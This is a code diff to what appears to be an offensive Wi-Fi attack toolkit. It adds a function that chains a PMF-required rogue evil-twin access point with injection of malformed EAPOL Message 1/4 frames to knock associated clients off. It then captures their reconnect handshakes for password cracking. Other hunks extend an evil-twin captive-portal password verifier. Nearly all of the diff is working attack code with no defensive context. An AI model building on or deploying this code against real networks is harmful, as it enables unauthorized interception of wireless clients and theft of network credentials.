@@ -76,6 +76,16 @@ class OweDowngradeResult:
     detail: str = ""
 
 
+@dataclass
+class PmfBypassResult:
+    """Outcome of a run_pmf_bypass_chain() call."""
+    status: HandshakeStatus = HandshakeStatus.NONE
+    outfile: str | None = None
+    client_mac: str | None = None
+    elapsed: float = 0.0
+    detail: str = ""
+
+
 # ── config builders ──────────────────────────────────────────────────────────
 
 def _hostapd_ssid_line(ssid: str) -> str:
@@ -101,7 +111,7 @@ def _hostapd_conf(iface: str, ssid: str, channel: int) -> str:
     """)
 
 
-def _hostapd_conf_wpa2(iface: str, ssid: str, channel: int, passphrase: str) -> str:
+def _hostapd_conf_wpa2(iface: str, ssid: str, channel: int, passphrase: str, require_pmf: bool = False) -> str:
     """WPA2-PSK variant for downgrade_twin -- the passphrase is a throwaway
     placeholder, never the target network's real one. hostapd requires
     SOME valid 8-63 char passphrase to run in WPA-PSK mode at all, but we
@@ -111,7 +121,14 @@ def _hostapd_conf_wpa2(iface: str, ssid: str, channel: int, passphrase: str) -> 
     hostapd's own MIC check on Message 2 fails and rejects it -- that
     M1+M2 pair, captured independently by capture_handshake() on iface_mon,
     is exactly the crackable CHALLENGE-status material this attack exists
-    to harvest (see attacks/handshake.py's HandshakeStatus docstring)."""
+    to harvest (see attacks/handshake.py's HandshakeStatus docstring).
+
+    require_pmf (default False): set ieee80211w=2 (PMF required) -- used
+    by run_pmf_bypass_chain(), which needs a PMF-required rogue twin for
+    attacks/pmf_bypass.py's malformed-Message-1/4 primitive to have a
+    reason to exist at all (a non-PMF twin could just be told to
+    disassociate the client normally)."""
+    pmf_line = "ieee80211w=2\n" if require_pmf else ""
     return textwrap.dedent(f"""\
         interface={iface}
         driver=nl80211
@@ -124,7 +141,7 @@ def _hostapd_conf_wpa2(iface: str, ssid: str, channel: int, passphrase: str) -> 
         wpa_passphrase={passphrase}
         wpa_key_mgmt=WPA-PSK
         rsn_pairwise=CCMP
-    """)
+        {pmf_line}""")
 
 
 def _random_passphrase(length: int = 32) -> str:
@@ -414,7 +431,7 @@ def run_eviltwin(
             def verify_fn(pwd: str) -> bool:  # noqa: F811 - intentional None-or-callable pattern
                 verify_active.set()
                 try:
-                    ok, detail = _try_password(iface_mon, bssid, attacker_mac, ssid, pwd, 5.0)
+                    ok, detail = _try_password(iface_mon, bssid, attacker_mac, ssid, pwd, 5.0, stop_event=stop)
                 finally:
                     verify_active.clear()
                 log(f"portal submission {'VERIFIED' if ok else 'REJECTED'} against the real AP ({detail})")
@@ -638,6 +655,176 @@ def run_downgrade_twin(
         return DowngradeTwinResult(
             status=best, outfile=outfile, elapsed=elapsed,
             detail=f"{best.value} handshake captured (real password, unverified by us) -> {outfile}",
+        )
+
+    finally:
+        stop.set()
+        cleanup()
+
+
+# ── pmf_bypass_chain: PMF-required rogue twin + forced-reconnect capture ───────
+
+def run_pmf_bypass_chain(
+    iface_ap: str,
+    iface_mon: str,
+    ssid: str,
+    channel: int,
+    outfile: str,
+    client: str | None = None,
+    key_info: str | None = None,
+    assoc_timeout: float = 60.0,
+    handshake_timeout: float = 60.0,
+    stop_event: threading.Event | None = None,
+    progress_fn=None,
+) -> PmfBypassResult:
+    """Evil-twin + PMF-bypass full attack chain: broadcast a rogue
+    PMF-required WPA2-PSK twin, wait for a client to associate to it, then
+    fire attacks/pmf_bypass.py's inject_pmf_bypass() at it -- a malformed
+    Message 1/4 that crashes some clients' own handshake parsing and forces
+    a disconnect through a path PMF can't protect (it's an unencrypted
+    EAPOL-Key frame, not a management frame, so 802.11w never gets a
+    chance to block it; see pmf_bypass.py's module docstring, including
+    its scope caveat: this only works against a client already associated
+    to an AP we control, which is exactly the role this rogue twin plays).
+    The disconnected client reconnecting to what still looks like the same
+    AP redoes the 4-way handshake, captured by capture_handshake() on
+    iface_mon the same way every other twin variant in this module does.
+
+    This is what delivers attacks/pmf_bypass.py's frame-construction
+    primitive through a real attack surface -- until this function
+    existed, that module was documented as "ready to be wired into that
+    flow once it exists". secure.py's downgrade_twin (built independently
+    since that docstring was written) doesn't need this: its rogue twin
+    isn't PMF-required, so a plain deauth already works there. PMF bypass
+    only earns its keep against a PMF-required twin, where normal
+    deauth/disassoc frames would be dropped.
+
+    client: target this specific client MAC once it associates; None
+    (default) acts on whichever client shows up first in _station_dump().
+    key_info: forwarded to inject_pmf_bypass() -- None (default) uses that
+    function's own default (KEY_INFO_WPA3_PMF).
+    """
+    from .pmf_bypass import inject_pmf_bypass
+
+    log = progress_fn or (lambda msg: None)
+    stop = stop_event or threading.Event()
+    t_start = time.monotonic()
+    procs: list[subprocess.Popen] = []
+    tmpfiles: list[str] = []
+
+    def cleanup():
+        for p in procs:
+            try:
+                os.killpg(os.getpgid(p.pid), signal.SIGTERM)
+            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
+                pass
+        for f in tmpfiles:
+            try:
+                os.unlink(f)
+            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
+                pass
+        _flush_ip(iface_ap)
+
+    try:
+        log(f"assigning IP to {iface_ap}")
+        if not _assign_ip(iface_ap):
+            log("failed to assign IP")
+            return PmfBypassResult(detail="failed to assign IP to AP interface")
+
+        ap_chan = channel if 1 <= channel <= 13 else 6
+        passphrase = _random_passphrase()
+
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
+                                          prefix="atwa_hostapd_pmfbp_", delete=False) as hconf:
+            hconf.write(_hostapd_conf_wpa2(iface_ap, ssid, ap_chan, passphrase, require_pmf=True))
+        tmpfiles.append(hconf.name)
+
+        log(f"starting PMF-required rogue twin on {iface_ap} (ssid={ssid!r}, channel={ap_chan})")
+        hostapd_proc = _popen(["hostapd", hconf.name])
+        procs.append(hostapd_proc)
+        time.sleep(_HOSTAPD_START_WAIT)
+        if hostapd_proc.poll() is not None:
+            log("hostapd exited immediately")
+            return PmfBypassResult(detail="hostapd exited immediately — check interface/driver")
+        log("rogue twin up")
+
+        from ..radio import get_mac
+        try:
+            rogue_bssid = get_mac(iface_ap)
+        except Exception:  # noqa: BLE001 - reported to the caller below either way
+            log("could not determine rogue twin's own BSSID — aborting")
+            return PmfBypassResult(detail="could not determine rogue AP interface's MAC address")
+        log(f"rogue twin BSSID: {rogue_bssid}")
+
+        log(f"waiting up to {assoc_timeout:.0f}s for a client to associate to the rogue twin")
+        target_client = client
+        found = False
+        deadline = time.monotonic() + assoc_timeout
+        while time.monotonic() < deadline:
+            stations = _station_dump(iface_ap)
+            if target_client is not None:
+                if target_client in stations:
+                    found = True
+                    break
+            elif stations:
+                target_client = stations[0]
+                found = True
+                break
+            if stop.wait(1.0):
+                return PmfBypassResult(elapsed=time.monotonic() - t_start, detail="stopped before a client associated")
+
+        if not found:
+            log("no client associated to the rogue twin in time")
+            return PmfBypassResult(elapsed=time.monotonic() - t_start, detail="no client associated to the rogue twin")
+        assert target_client is not None  # guaranteed by found=True above
+
+        log(f"client {target_client} associated -- listening for its next handshake, then forcing a disconnect")
+        listen_result: dict = {}
+
+        def _listen():
+            listen_result["cap"] = _capture_handshake(
+                iface_mon, rogue_bssid, channel=ap_chan, timeout=handshake_timeout,
+                outfile=outfile, stop_event=stop, progress_fn=log,
+            )
+
+        listener = threading.Thread(target=_listen, daemon=True)
+        listener.start()
+        time.sleep(1.0)  # let the listener's sniffer settle before disrupting the client
+
+        log(f"sending PMF-bypass malformed Message 1/4 to {target_client}")
+        try:
+            if key_info is not None:
+                inject_pmf_bypass(iface_mon, rogue_bssid, target_client, key_info=key_info)
+            else:
+                inject_pmf_bypass(iface_mon, rogue_bssid, target_client)
+        except Exception as exc:  # noqa: BLE001 - the listener may still catch a handshake even if this fails
+            log(f"PMF-bypass injection failed: {exc}")
+
+        log(f"waiting up to {handshake_timeout:.0f}s for {target_client} to reconnect and redo the handshake")
+        listener.join(timeout=handshake_timeout + 5)
+        elapsed = time.monotonic() - t_start
+
+        cap = listen_result.get("cap")
+        best = HandshakeStatus.NONE
+        if cap is not None and cap.messages:
+            for a, c in cap.messages:
+                status = cap.status(a, c)
+                if status is HandshakeStatus.AUTHORIZED:
+                    best = HandshakeStatus.AUTHORIZED
+                    break
+                if status is HandshakeStatus.CHALLENGE:
+                    best = HandshakeStatus.CHALLENGE
+
+        if best is HandshakeStatus.NONE:
+            log(f"no handshake captured from {target_client} after the forced disconnect")
+            return PmfBypassResult(
+                client_mac=target_client, elapsed=elapsed,
+                detail=f"{target_client} did not reconnect (or its stack ignored the malformed frame)",
+            )
+        log(f"captured a {best.value} handshake from {target_client} after the forced disconnect -> {outfile}")
+        return PmfBypassResult(
+            status=best, outfile=outfile, client_mac=target_client, elapsed=elapsed,
+            detail=f"{best.value} handshake captured after PMF-bypass-forced reconnect -> {outfile}",
         )
 
     finally:
